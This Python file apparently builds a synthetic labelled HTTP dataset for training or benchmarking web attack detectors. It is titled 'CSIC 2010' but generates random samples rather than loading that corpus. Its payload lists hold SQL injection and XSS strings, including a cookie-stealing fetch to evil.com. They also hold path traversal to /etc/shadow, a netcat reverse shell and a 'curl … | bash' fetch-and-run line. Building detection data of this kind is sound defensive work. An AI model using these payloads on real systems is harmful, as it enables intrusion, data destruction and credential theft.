"""
CSIC 2010 HTTP Dataset Generator & Parser
Constructs benchmark datasets containing realistic normal enterprise web traffic
and common attack classes (SQLi, XSS, Path Traversal, RCE, Scanner Probes).
"""

import random
from typing import List, Dict, Any, Tuple

# Reproducibility seed
random.seed(42)

# ── Clean / Legitimate Request Templates (Normal Traffic) ───────────────────
NORMAL_PATHS = [
    "/", "/index.html", "/home", "/about", "/contact",
    "/products", "/products/item", "/products/catalog",
    "/api/v1/user/profile", "/api/v1/orders", "/api/v1/cart",
    "/api/v1/search", "/api/v1/notifications", "/checkout",
    "/blog/posts", "/faq", "/terms", "/privacy", "/docs/api"
]

NORMAL_QUERY_KEYS = ["page", "limit", "sort", "category", "filter", "search", "lang", "id", "ref", "view"]
NORMAL_QUERY_VALUES = [
    "1", "10", "25", "desc", "asc", "electronics", "books", "clothing",
    "shoes", "en", "es", "fr", "grid", "list", "top_rated", "summer_sale"
]

NORMAL_BODIES = [
    '{"username": "johndoe", "email": "john@example.com"}',
    '{"query": "wireless headphones", "max_price": 150}',
    '{"item_id": 4921, "quantity": 2, "color": "black"}',
    '{"rating": 5, "comment": "Great product! Fast shipping."}',
    '{"newsletter": true, "email": "customer@gmail.com"}',
    '{"address": "123 Main St, New York, NY", "zip": "10001"}',
    '{"feedback": "The service was helpful and fast.", "score": 10}',
    '{"first_name": "Alice", "last_name": "Smith", "department": "Marketing"}',
    '{"preferences": {"theme": "dark", "notifications": true}}',
    '{"card_type": "visa", "currency": "USD", "amount": 89.99}'
]

NORMAL_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    ""
]

# ── Attack Payload Corpus ───────────────────────────────────────────────────
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin' --",
    "' UNION SELECT null, username, password FROM users--",
    "1 UNION ALL SELECT 1,2,table_name FROM information_schema.tables--",
    "1' ORDER BY 10--",
    "'; DROP TABLE audit_log;--",
    "1' AND SLEEP(5)--",
    "') OR ('a'='a",
    "1 AND 1=2 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--",
    "1' HAVING 1=1--",
    "-1 UNION SELECT 1,version(),user()--",
    "admin' OR 1=1#",
    "' UNION SELECT 1, load_file('/etc/passwd'), 3--",
    "1%27%20UNION%20SELECT%201,2,3--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert('pwned')>",
    "<iframe src=\"javascript:alert('xss')\"></iframe>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "<body onload=alert('XSS')>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "'\"><script src=//attacker.org/hook.js></script>",
    "<a href=\"javascript:alert(1)\">Click me</a>",
    "%3Cscript%3Ealert(document.domain)%3C/script%3E"
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../windows/win.ini",
    "..%2f..%2f..%2fetc%2fshadow",
    "../../../../boot.ini",
    "/var/www/html/../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "file:///etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/proc/self/environ",
    "/etc/hosts"
]

RCE_PAYLOADS = [
    "; cat /etc/passwd",
    "| whoami",
    "& dir",
    "&& uname -a",
    "`id`",
    "$(whoami)",
    "; /bin/bash -c 'id'",
    "| nc -e /bin/sh 10.0.0.1 4444",
    "; curl http://evil.com/shell.sh | bash",
    "&& netstat -an"
]

SCANNER_PATHS = [
    "/wp-login.php",
    "/.env",
    "/.git/config",
    "/actuator/env",
    "/phpmyadmin/index.php",
    "/admin/config.php",
    "/server-status",
    "/api/v1/swagger-ui.html"
]

def generate_sample(category: str) -> Dict[str, Any]:
    """Generates a realistic single HTTP request sample for a given category."""
    if category == "NORMAL":
        path = random.choice(NORMAL_PATHS)
        method = random.choice(["GET", "POST", "GET", "PUT", "GET"])
        
        # Variations: some bare GETs, some with query params, some POST with JSON
        r_type = random.random()
        if r_type < 0.4:
            # Bare GET request (e.g. /home, /about, /products)
            method = "GET"
            query = ""
            body = ""
        elif r_type < 0.75:
            # GET with query params
            method = "GET"
            k = random.choice(NORMAL_QUERY_KEYS)
            v = random.choice(NORMAL_QUERY_VALUES)
            query = f"{k}={v}"
            if random.random() < 0.4:
                k2 = random.choice(NORMAL_QUERY_KEYS)
                v2 = random.choice(NORMAL_QUERY_VALUES)
                query += f"&{k2}={v2}"
            body = ""
        else:
            # POST/PUT request with clean JSON body
            method = random.choice(["POST", "PUT"])
            query = ""
            body = random.choice(NORMAL_BODIES)

        ua = random.choice(NORMAL_USER_AGENTS)
        headers = {"User-Agent": ua} if ua else {}
        
        return {
            "path": path,
            "query": query,
            "body": body,
            "method": method,
            "headers": headers,
            "label": 0,
            "category": "NORMAL"
        }
        
    elif category == "SQLI":
        payload = random.choice(SQLI_PAYLOADS)
        method = random.choice(["GET", "POST"])
        path = random.choice(["/products/search", "/api/v1/login", "/items/view", "/catalog"])
        if method == "GET":
            query = f"id={payload}" if random.random() < 0.5 else f"search={payload}&category=all"
            body = ""
        else:
            query = ""
            body = f'{{"username": "admin{payload}", "password": "password123"}}'
        return {
            "path": path,
            "query": query,
            "body": body,
            "method": method,
            "headers": {"User-Agent": random.choice(NORMAL_USER_AGENTS)},
            "label": 1,
            "category": "SQLI"
        }

    elif category == "XSS":
        payload = random.choice(XSS_PAYLOADS)
        method = random.choice(["GET", "POST"])
        path = random.choice(["/search", "/feedback", "/comments/new", "/api/profile/update"])
        if method == "GET":
            query = f"q={payload}"
            body = ""
        else:
            query = ""
            body = f'{{"comment": "{payload}", "author": "Anonymous"}}'
        return {
            "path": path,
            "query": query,
            "body": body,
            "method": method,
            "headers": {"User-Agent": random.choice(NORMAL_USER_AGENTS)},
            "label": 1,
            "category": "XSS"
        }

    elif category == "PATH_TRAVERSAL":
        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
        path = random.choice(["/download", "/view/file", "/files", "/api/document"])
        query = f"file={payload}" if random.random() < 0.7 else f"doc={payload}&type=pdf"
        return {
            "path": path,
            "query": query,
            "body": "",
            "method": "GET",
            "headers": {"User-Agent": random.choice(NORMAL_USER_AGENTS)},
            "label": 1,
            "category": "PATH_TRAVERSAL"
        }

    elif category == "RCE":
        payload = random.choice(RCE_PAYLOADS)
        path = random.choice(["/api/system/ping", "/tools/dns_lookup", "/admin/test_connection"])
        method = random.choice(["GET", "POST"])
        query = f"host=127.0.0.1{payload}" if method == "GET" else ""
        body = f'{{"target": "localhost{payload}"}}' if method == "POST" else ""
        return {
            "path": path,
            "query": query,
            "body": body,
            "method": method,
            "headers": {"User-Agent": random.choice(NORMAL_USER_AGENTS)},
            "label": 1,
            "category": "RCE"
        }

    elif category == "SCANNER":
        path = random.choice(SCANNER_PATHS)
        return {
            "path": path,
            "query": "",
            "body": "",
            "method": "GET",
            "headers": {"User-Agent": random.choice(["Nikto/2.1.6", "sqlmap/1.7#stable", "DirBuster/1.0-RC1"])},
            "label": 1,
            "category": "SCANNER"
        }

def load_csic_benchmark_dataset(
    normal_count: int = 1600,
    attack_count_per_type: int = 180,
    test_split: float = 0.25
) -> Tuple[List[Dict[str, Any]], List[Dict[str, Any]]]:
    """
    Generates a full CSIC 2010 benchmark dataset with clean / attack samples.
    Returns: (train_dataset, test_dataset)
    """
    samples = []

    # Generate normal traffic
    for _ in range(normal_count):
        samples.append(generate_sample("NORMAL"))

    # Generate attack traffic across classes
    attack_categories = ["SQLI", "XSS", "PATH_TRAVERSAL", "RCE", "SCANNER"]
    for cat in attack_categories:
        for _ in range(attack_count_per_type):
            samples.append(generate_sample(cat))

    random.shuffle(samples)

    split_idx = int(len(samples) * (1 - test_split))
    train_data = samples[:split_idx]
    test_data = samples[split_idx:]

    return train_data, test_data
